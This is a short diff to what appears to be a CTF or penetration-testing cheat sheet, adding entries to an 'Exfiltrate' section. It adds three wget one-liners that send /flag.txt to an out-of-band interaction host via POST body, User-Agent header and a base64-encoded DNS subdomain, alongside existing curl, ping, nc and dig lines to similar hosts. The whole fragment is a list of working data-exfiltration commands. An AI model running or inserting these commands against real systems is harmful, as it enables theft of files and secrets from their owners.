@@ -42,6 +42,9 @@ MySQL >=5.6
 ### Exfiltrate
 
     curl -T /flag.txt xxxx.interct.sh
+    wget --post-file /flag.txt xxxx.interct.sh
+    wget -U `cat /flag.txt` xxxx.interct.sh
+    wget `base64 -w0 /flag.txt`.xxxx.interct.sh
     ping here.xxx.interact.sh
     nc nchere.xxx.interact.sh 80
     dig dighere.xxx.interact.sh
